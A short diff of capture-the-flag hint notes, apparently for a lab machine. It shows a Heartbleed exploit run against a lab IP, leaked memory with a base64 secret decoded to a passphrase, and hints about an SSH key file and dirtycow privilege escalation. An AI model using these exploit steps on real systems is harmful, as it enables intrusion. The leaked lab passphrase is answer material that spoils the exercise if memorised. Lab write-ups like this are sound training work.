@@ -1,0 +1,25 @@
+DONT forget your nmap vul scans...
+
+python 32745.py 10.129.162.127 
+
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 7E  mV0aGVoeXBlCg==~
+  0160: F3 CC AA 12 9A 15 64 93 4D D9 7D 23 91 BC 90 B5  ......d.M.}#....
+
+aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== 
+
+heartbleedbelievethehype
+
+the rest you probz got it
+
+if rockyou and a few other password list not working... most likely you can't bruteforce it try harder
+
+hype_key, hence hype
+
+dirtycow
